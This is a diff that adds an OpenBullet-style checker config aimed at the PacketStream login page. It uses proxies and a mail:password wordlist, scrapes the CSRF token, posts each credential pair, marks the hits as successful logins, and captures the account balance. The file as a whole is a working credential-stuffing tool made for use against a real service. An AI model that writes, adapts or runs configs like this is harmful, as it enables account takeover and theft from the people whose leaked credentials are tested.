@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "PacketStream",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-26T00:26:23.435897+02:00",
+  "AdditionalInfo": "",
+  "Author": "xX-365094-Xx",
+  "Version": "1.2.6.4 [Paradox Mod]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://packetstream.io/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "type=hidden name=csrf value=\"" "\"><div" -> VAR "KEY" 
+
+REQUEST POST "https://packetstream.io/login" 
+  CONTENT "csrf=<KEY>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<li><a href=/login>Login</a>" 
+  KEYCHAIN Success OR 
+    KEY "class=sidebar-nav-item>Logout</span></a>" 
+
+PARSE "<SOURCE>" CSS "#content-area > div:nth-child(5) > div:nth-child(1) > h2" "innerHTML" -> CAP "Blance" 
+
